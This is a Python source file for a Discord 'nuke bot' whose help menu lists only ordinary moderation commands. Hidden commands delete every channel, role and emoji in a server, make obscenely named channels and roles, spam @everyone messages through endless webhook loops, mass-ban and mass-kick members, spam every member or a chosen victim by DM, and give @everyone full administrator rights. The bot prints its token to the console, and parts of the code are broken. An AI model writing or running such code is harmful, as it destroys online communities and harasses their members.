import time
import discord
import asyncio
import colorama
import json
import random
import os
import sys, requests
from dotenv import load_dotenv
from discord.ext import commands
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from inputimeout import inputimeout, TimeoutOccurred
from colorama import init, Fore
if sys.platform == 'linux':
    import simplejson as json
else:
    import json


######################################setup########################################

ascii_art = [r"""
```
⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⡴⠚⠉⠉⠀⠀⠀⠉⠙⠓⢦⡀⠀⠀⠀⠀⠀⠀
⠀⣰⠋⠀⣀⣠⣤⣤⣤⡄⠀⣤⠤⠤⢿⣦⠀⠀⠀⠀⠀
⢰⠇⠀⠰⡅⠀⠰⢆⡼⠀⠀⠳⢤⡼⠟⠈⣧⠀⠀⠀⠀
⣼⠀⠀⠀⢉⣉⣉⣩⣤⠤⠤⠤⠶⢶⠒⠀⢸⡄⠀⠀⠀
⣿⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⢀⠀⣸⠀⢀⡼⠀⠀⢰⠀
⠘⢷⣀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡴⢃⡴⠋⠀⠀⣰⢉⠇
⠀⠀⠉⣳⠦⢤⣤⣤⣤⠤⣮⠶⢻⡏⡀⢤⣲⠝⠚⠁⠀
⠀⠀⣰⠃⢠⠴⣚⡭⠖⠉⠀⠀⢸⡧⠚⠉⠀⠀⠀⠀⠀
⠀⢠⡏⠀⠐⠋⠁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀
```
""",
r"""
```
  █████▒█    ██  ▄████▄   ██ ▄█▀   ▓██   ██▓ ▒█████   █    ██ 
▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒     ▒██  ██▒▒██▒  ██▒ ██  ▓██▒
▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░      ▒██ ██░▒██░  ██▒▓██  ▒██░
░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄      ░ ▐██▓░▒██   ██░▓▓█  ░██░
░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄     ░ ██▒▓░░ ████▓▒░▒▒█████▓ 
 ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒      ██▒▒▒ ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ 
 ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░    ▓██ ░▒░   ░ ▒ ▒░ ░░▒░ ░ ░ 
 ░ ░    ░░░ ░ ░ ░        ░ ░░ ░     ▒ ▒ ░░  ░ ░ ░ ▒   ░░░ ░ ░ 
          ░     ░ ░      ░  ░       ░ ░         ░ ░     ░     
                ░                   ░ ░                       
```
""",
r"""
```
...................... / ´¯ /)
...................., / ¯ ../
................... / .... /
............. / ´¯ /'...'/ ´¯¯` · ¸
.......... / '/ ... / .... / ....... / ¨¯ \
........ ('(... ´ ... ´ .... ¯ ~ /' ... ')
......... \ .................'..... /
..........''... \ .......... _. · ´
............ \ .............. (
.............. \ ............. \ ...
```
""",
"""
```
######## ##     ##  ######  ##    ##    ##    ##  #######  ##     ## 
##       ##     ## ##    ## ##   ##      ##  ##  ##     ## ##     ## 
##       ##     ## ##       ##  ##        ####   ##     ## ##     ## 
######   ##     ## ##       #####          ##    ##     ## ##     ## 
##       ##     ## ##       ##  ##         ##    ##     ## ##     ## 
##       ##     ## ##    ## ##   ##        ##    ##     ## ##     ## 
##        #######   ######  ##    ##       ##     #######   #######  
```
"""]


youtube = ['https://www.youtube.com/watch?v=zENKRiJrq6Y']
discord_sv = ['https://discord.gg/F8eeqRh9aG', 'https://discord.gg/f7k3J8ZTRw']

# Default Settings
timeout = 6

TIME = f'{Fore.MAGENTA}[{time.strftime("%H:%M:%S", time.localtime())}] {Fore.RESET}'

settings = {"token":None,'user_id':None,"bot_status":"offline", 'prefix':None}

channel_names = ['𝗙𝘂𝗰𝗸', '𝗙𝘂𝗰𝗸', '𝗙𝘂𝗰𝗸', '𝗙𝘂𝗰𝗸', '𝗙𝘂𝗰𝗸','𝗙𝘂𝗰𝗸','𝗙𝘂𝗰𝗸']

message_spam = [f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',f'@everyone \n𝗙𝘂𝗰𝗸\n{random.choice(youtube)}\n{random.choice(ascii_art)}',]

webhook_names = ['𝗙𝘂𝗰𝗸', '𝗙𝘂𝗰𝗸','𝗙𝘂𝗰𝗸','Ayuly Here']

load_dotenv()

settings['token'] = os.getenv('TOKEN')
settings['user_id'] = int(os.getenv('USER_ID'))
settings['prefix'] = os.getenv('PREFIX')

client = commands.Bot(command_prefix=settings['prefix'], intents = discord.Intents.all(), help_command=None)

####################################Function Setup#################################
def consoleLog(message, print_time=True):
    if True:
        TIME = ''
        if print_time:
            TIME = f'{Fore.MAGENTA}[{time.strftime("%H:%M:%S", time.localtime())}] {Fore.RESET}'

        try:
            print(f'{TIME}{message}')
        except TypeError: # when there's a character that can't be logged with python print function.
            sys.stdout.buffer.write(f'{TIME}{message}'.encode('utf8'))

def setup():
    try:
        # from getpass import getpass
        # settings['token'] = getpass('Enter token. Note: Whatever you entered here will not be displayed.\n>> ')
        settings['token'] = input('Enter token. If you are new refer to this guide: https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot/wiki/Basic-setup-and-knowledge-for-using-the-bot\n>> ')
        settings['user_id'] = input('\nEnter your discord user ID. It is recommended to use discord user ID because some unicode names are hard for the code to check.\n>> ')
    except KeyboardInterrupt:
        sys.exit(0)
    except EOFError:
        print('Invalid input/EOFError. This may be caused by some unicode.')
        exit()

def checkToken(token=None):
    if token is None:
        token = settings['token']

    global is_selfbot, headers 
    try:
        headers = {'authorization': token, 'content-type': 'application/json'}
        print('Checking selfbot token.', end='\r')
        if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
            # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
            # Reading source codes is always a good thing :)
            headers['authorization'] = 'Bot ' + token
            print('Checking normal bot token.', end='\r')
            if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
                print('Invalid token is being used.')
                exit()
            else:
                is_selfbot = False
    # except requests.exceptions.ProxyError:
    #     print('Bad proxy is being used. You can try to change a proxy or restart the bot.')
    #     exit()
    # except requests.exceptions.ConnectTimeout:
    #     print(f'Proxy reached maximum load time: timeout is {timeout} seconds long.')
    #     exit()
    except requests.exceptions.ConnectionError:
        print('You should probably consider connecting to the internet before using any discord related stuff. If you are connected to wifi and still seeing this message, then maybe try turn off your VPN/proxy/TOR node. If you are still seeing this message or you just don\'t what to turn off vpn, you can try to use websites like repl/heroku/google cloud to host the bot for you. The source code is on https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot.')
        exit()
    except (requests.exceptions.InvalidHeader, json.decoder.JSONDecodeError):
        print('Invalid token is being used.')
        exit()


## On/Off custom token & your discord id ##
if False:
	setup()
	checkToken()

###################################################################################
@client.event
async def on_ready():
  if True:
    await changeStatus(None, settings['bot_status'])
    try:
      exit()
    except:
      pass
  if sys.platform == 'linux':
  	os.system('clear')
  else:
  	os.system('cls')
  await client.change_presence(activity=discord.Game(name= "Fuck You" ))#change this if you want
  print(f''' 
\x1B[38;2;41;128;185m 
 ▄▄▄     ▓██   ██▓ █    ██  ██▓   ▓██   ██▓
▒████▄    ▒██  ██▒ ██  ▓██▒▓██▒    ▒██  ██▒
▒██  ▀█▄   ▒██ ██░▓██  ▒██░▒██░     ▒██ ██░
░██▄▄▄▄██  ░ ▐██▓░▓▓█  ░██░▒██░     ░ ▐██▓░
 ▓█   ▓██▒ ░ ██▒▓░▒▒█████▓ ░██████▒ ░ ██▒▓░
 ▒▒   ▓▒█░  ██▒▒▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░  ██▒▒▒ 
  ▒   ▒▒ ░▓██ ░▒░ ░░▒░ ░ ░ ░ ░ ▒  ░▓██ ░▒░ 
  ░   ▒   ▒ ▒ ░░   ░░░ ░ ░   ░ ░   ▒ ▒ ░░  
      ░  ░░ ░        ░         ░  ░░ ░     
          ░ ░                      ░ ░     

\x1B[37m═══════════════════════════
Logged In As {client.user}
Type $help To Begin Nuking
Version: Free Beta v0.2
Token: \x1B[33m{settings["token"]}
\x1B[37mUser Id: \x1B[33m{settings["user_id"]}\x1B[37m
Prefix: \x1B[33m{settings["prefix"]}\x1B[37m
═══════════════════════════
''')

############################## Normal ########################################

######## Help #######
@client.command(name="help", aliases=['hp', 'Hp', 'HP'])
async def help(ctx, command=None):
	await ctx.message.delete()
	help_command = {'help_menu':f'''
```
𝗛𝗲𝗹𝗽 𝗠𝗲𝗻𝘂

- ban              <Ban User>

- unban            <Ban User> 

- kick             <Kick User> 

- ping             <Show Your Ping> 

- numberforyou     <Random Of Number For You>  

- createrole	   <Create a Role>

- help             <Show This Message> [{settings["prefix"]}help]

Use {settings["prefix"]}help <command>
```
''',
'ban':f'```Usage: {settings["prefix"]}ban <user> <reason>```', 

'unban':f'```Usage: {settings["prefix"]}unban <user>```',

'kick':f'```Usage: {settings["prefix"]}kick <user> <reason>```',

'ping':f'```Usage: {settings["prefix"]}ping```',

'numberforyou':f'```Usage: {settings["prefix"]}numberforyou <min> <max>\nAliases: {settings["prefix"]}nfy```',

'nfy':f'```Usage: {settings["prefix"]}numberforyou <min> <max>\nAliases: {settings["prefix"]}nfy```',

'createrole':f'''```Usage: {settings["prefix"]}createrole <name> <color> <permissions>
Aliases: {settings["prefix"]}crole
```
''',

'help':f'```Aliases: hp```'
}
	if command == None:
		await ctx.send(help_command['help_menu'])
	elif command == 'ban':
		await ctx.send(help_command['ban'])
	elif command == 'unban':
		await ctx.send(help_command['unban'])
	elif command == 'kick':
		await ctx.send(help_command['kick'])
	elif command == 'ping':
		await ctx.send(help_command['ping'])
	elif command == 'numberforyou':
		await ctx.send(help_command['numberforyou'])
	elif command == 'nfy':
		await ctx.send(help_command['nfy'])
	elif command == 'help':
		await ctx.send(help_command['help'])
	elif command == 'createrole':
		await ctx.send(help_command['createrole'])

####### Ban #########
@client.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member:discord.Member, *,reason='No Reason!'):
	if member == None or member == ctx.message.author:
		await ctx.channel.send("You cannot ban yourself")
		return
	try:
		await member.send(f'You are banned from server {ctx.guild.name}\nReason: {reason}')
		await member.ban(reason=reason)
		await ctx.send(f'Ban Successfully {member}\nReason: {reason}')
		consoleLog(f'{Fore.GREEN}{member} was banned by {ctx.message.author}\nReason: {reason}')
	except:
		await ctx.send(f'Cant Found {member}')
		consoleLog(f'{Fore.YELLOW}{ctx.message.author} ban {member} but not found!')

######## Unban ########
@client.command()
@commands.has_permissions(administrator = True)
async def unban(ctx, *, member):
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member.split("#")

    for ban_entry in banned_users:
        user = ban_entry.user

        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f'Unbanned {user.mention}')
            consoleLog(f'{Fore.GREEN}{member} was unbanned by {ctx.message.author}')
            return

####### Kick #########
@client.command()
@commands.has_permissions(manage_roles = True, ban_members=True)
async def kick(ctx, member:discord.Member, *, reason='No Reason!'):
	if member == None or member == ctx.message.author:
		await ctx.channel.send("You cannot kick yourself")
		return
	try:
		await member.send(f'You are kicked from server {ctx.guild.name}\nReason: {reason}')
		await member.kick(reason=reason)
		await ctx.send(f'Kick Successfully {member}\nReason: {reason}')
		consoleLog(f'{Fore.GREEN}{member} was kicked by {ctx.message.author}\nReason: {reason}')
	except:
		await ctx.send(f'Cant Found {member}')
		consoleLog(f'{Fore.YELLOW}{ctx.message.author} kick {member} but not found!')

####### Ping #########
@client.command()
async def ping(ctx):
	before = time.monotonic()
	message = await ctx.send("Pong!")
	ping = (time.monotonic() - before) * 1000
	await ctx.send(f'{ctx.message.author}, your Ping is {int(ping)}ms !')

####### Number of Day #######
@client.command(name='Number for you', aliases=['nfy'])
async def numberforyou(ctx, minn:int=0, maxx:int=100):
	try:
		await ctx.send(f'{ctx.message.author}, your number: {random.randint(minn, maxx)}')
	except:
		await ctx.send(f'Have Error!')

####### Create Role ##########
@client.command(name='createrole', aliases=['crole'])
@commands.has_permissions(manage_roles=True)
async def createrole(ctx, name:str='New Role'):
	guild = ctx.guild
	await guild.create_role(name=name)
	await ctx.send(f'Role `{name}` has been created')

############################# Nuke #########################################


@client.command(name='changeStatus', aliases=['cs'])
async def changeStatus(ctx, status):
    if status == 'offline':
        await client.change_presence(status=discord.Status.offline)
    elif status == 'invisible':
        await client.change_presence(status=discord.Status.invisible)
    elif status == 'online':
        await client.change_presence(status=discord.Status.online)
    elif status == 'idle':
        await client.change_presence(status=discord.Status.idle)
    elif status == 'dnd' or status == 'do_not_disturb':
        await client.change_presence(status=discord.Status.do_not_disturb)

######## Nuke ########
@client.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()
  await ctx.guild.edit(name="𝗙𝘂𝗰𝗸")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      consoleLog(f"{Fore.GREEN}{channel.name} Has Been Successfully Deleted!{Fore.RESET}", True)
    except:
        pass
        consoleLog(f"{Fore.RED}Unable To Delete Channel!{Fore.RESET}", True)
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      consoleLog(f"{Fore.GREEN}Successfully Made Channel [{i}]!{Fore.RESET}", True)
    except:
      consoleLog(f"{Fore.RED}Unable To Create Channel!{Fore.RESET}")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      consoleLog(f"{Fore.GREEN}{role.name}Has Been Successfully Deleted!{Fore.RESET}")

    except:
      consoleLog(f"{Fore.RED} {role.name}Is Unable To Be Deleted{Fore.RESET}")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam))
          consoleLog(f"{Fore.GREEN}{channel.name} Has Been Spammed Message!{Fore.RESET}")
        except:
          consoleLog(f"{Fore.RED}Unable To Spammed Message{channel.name}!{Fore.RESET}")
    for member in ctx.guild.members:
      if member.id != settings['user_id'] or member != client.user:  
        try:
          await member.ban(reason= "𝗙𝘂𝗰𝗸")
          consoleLog(f"{Fore.GREEN}{member.name}Has Been Successfully Banned In {ctx.guild.name}{Fore.RESET}")
        except:
          consoleLog(f"{Fore.RED}Unable To Ban {member.name} In {ctx.guild.name}!{Fore.RESET}")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))



@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Please pass in all requirements :rolling_eyes:.')
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You dont have the permissions :angry:")


######## Ban #######
@client.command()
async def banall(ctx):
	await ctx.message.delete()
	for member in ctx.guild.members:
		if member.id == settings['user_id'] or member == client.uesr:
			pass
		else:
			try:
				await ctx.guild.ban(user)
				consoleLog(f"{Fore.GREEN}{member.name} Has Been Successfully Banned In {ctx.guild.name}{Fore.RESET}")
			except:
				consoleLog(f"{Fore.RED}Unable To Ban {member.name} In {ctx.guild.name}!{Fore.RESET}")
  

####### Kick ########
@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
  	if member.id == settings['user_id'] or member == client.uesr:
  		pass
  	else:
	    try:
	      await member.kick(reason="𝗙𝘂𝗰𝗸")
	      consoleLog(f"{Fore.GREEN}{member.name} Has Been Successfully Kicked In {ctx.guild.name}{Fore.RESET}")
	    except:
	      consoleLog(f"{Fore.RED}Unable To Kick {member.name} In {ctx.guild.name}!{Fore.RESET}")

###### Role Spam #######
@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"𝗙𝘂𝗰𝗸")
      consoleLog(f"{Fore.GREEN}Successfully Created Role In {ctx.guild.name}!{Fore.RESET}")
    except:
      consoleLog(f"{Fore.RED}Unable To Create Roles In {ctx.guild.name}!{Fore.RESET}")

####### Emoji Delete #######
@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                consoleLog(f"{Fore.GREEN}Successfully Deleted Emoji {emoji.name} In {ctx.guild.name}!{Fore.RESET}")
            except:
                consoleLog(f"{Fore.RED}Unable To Delete Emoji {emoji.name} In {ctx.guild.name}!{Fore.RESET}")

####### DM ########
@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      consoleLog(f"{Fore.GREEN}DMed All Members In {ctx.guild.name}!{Fore.RESET}")
    except:
      consoleLog(f"\x1b[38;5;196m[!] Unable To DM Members In {ctx.guild.name}!{Fore.RESET}")

####### DM Spam #######
@client.command(name="dmspama", aliases=["dmspa"])
async def dmspamall(ctx, amount=50, *, message=None):
	await ctx.message.delete()
	for user in list(ctx.guild.members):
		if user.id == settings['user_id'] or user == client.user:
			pass
		else:
			if message == None:
				for _ in range(1, amount+1):
					try:
						await user.send(f'<@!{user.id}> \n{random.choice(message_spam)}{Fore.RESET}')
						# print(f'<@!{user.id}> \n{random.choice(message_spam)}')
						consoleLog(f"{Fore.GREEN}Spamed {user} [{_}] in Server {ctx.guild.name}!{Fore.RESET}")
					except:
						consoleLog(f"{Fore.RED}Unable To Spam {user} In {ctx.guild.name}!{Fore.RESET}{Fore.RESET}")
			else:
				for _ in range(0, amount):
					try:

						#print(f"{str(user)[0:str(user).index('#')]} \n[*] Message:\n{message}")
						await user.send(f"<@!{user.id}> \n{message}")
						consoleLog(f"{Fore.GREEN}Spamed {user} In {ctx.guild.name}!{Fore.RESET}")
					except:
						consoleLog(f"{Fore.RED}Unable To Spam {user} In {ctx.guild.name}!{Fore.RESET}")

####### DMvic Spam #######
@client.command(name="dmvspama", aliases=["dmvspa"])
async def dmvicspamall(ctx, amount=50, message='None', *, vic:discord.member.Member):
	await ctx.message.delete()
	user = vic
	if user.id == settings['user_id'] or user == client.user:
		pass
	else:
		if message == 'None':
			for _ in range(1, amount+1):
				try:
					await user.send(f'<@!{user.id}> \n{random.choice(message_spam)}{Fore.RESET}')
					# print(f'<@!{user.id}> \n{random.choice(message_spam)}')
					consoleLog(f"{Fore.GREEN}Spamed {user} [{_}]!{Fore.RESET}")
				except:
					consoleLog(f"{Fore.RED}Unable To Spam {user} In {ctx.guild.name}!{Fore.RESET}{Fore.RESET}")
		else:
			for _ in range(0, amount):
				try:
					#print(f"{str(user)[0:str(user).index('#')]} \n[*] Message:\n{message}")
					await user.send(f"<@!{user.id}> \n{message}")
					consoleLog(f"{Fore.GREEN}Spamed {user} In {ctx.guild.name}!{Fore.RESET}")
				except:
					consoleLog(f"{Fore.RED}Unable To Spam {user} In {ctx.guild.name}!{Fore.RESET}")

####### Give Admin Permission #########
@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      consoleLog(f"{Fore.GREEN}Gave @everyone Admin In {ctx.guild.name}!{Fore.RESET}") 
                  except:
                      consoleLog(f"{Fore.RED}Unable To Give @everyone Admin In {ctx.guild.name}!{Fore.RESET}")

###### Off Status#######
@client.command()
async def off_status(ctx):
	await ctx.message.delete()
	await changeStatus(None, settings['bot_status'])
	try:
		exit()
	except:
		pass
	# await client.logout()

####### Shutdown Bot ######
@client.command()
async def off(ctx):
	await ctx.message.delete()
	await changeStatus(None, settings['bot_status'])
	exit()
	# await client.logout()

@client.event
async def on_connect():
	await changeStatus(None, settings['bot_status'])


client.run(settings['token'])